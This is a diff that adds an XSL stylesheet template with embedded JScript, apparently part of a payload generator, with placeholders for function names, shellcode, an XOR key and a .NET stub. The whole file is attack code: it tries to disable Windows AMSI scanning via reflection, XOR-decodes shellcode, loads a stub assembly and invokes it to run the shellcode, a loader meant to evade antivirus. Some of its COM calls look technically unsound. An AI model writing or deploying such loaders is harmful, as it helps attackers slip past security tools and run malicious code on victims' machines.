@@ -1,0 +1,29 @@
+<?xml version="1.0"?>
+<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" version="1.0"
+            xmlns:ms="urn:schemas-microsoft-com:xslt"
+            xmlns:user="placeholder">
+<output method="text"/>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+function {{ v.fn_amsi }}() {
+    try {
+        var asm = new ActiveXObject("System.Reflection.Assembly");
+        var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
+        if (amsi !== null) amsi.GetField("amsiInitFailed", 36).SetValue(null, true);
+    } catch (e) {}
+}
+{{ v.fn_amsi }}();
+
+var hex = "{{ shellcode_hex }}";
+var key = "{{ key_hex }}";
+
+function hex2arr(h) { var a=[]; for (var i=0; i<h.length; i+=2) a.push(parseInt(h.substr(i,2),16)); return a; }
+function xor(d,k) { var o=[]; for (var i=0;i<d.length;i++) o.push(d[i] ^ k[i % k.length]); return o; }
+
+var sc = xor(hex2arr(hex), hex2arr(key));
+var loader = new ActiveXObject("System.Reflection.Assembly");
+var asm = loader.Load(hex2arr("{{ v.dotnet_stub_hex }}"));
+asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
+]]>
+</ms:script>
+</stylesheet>
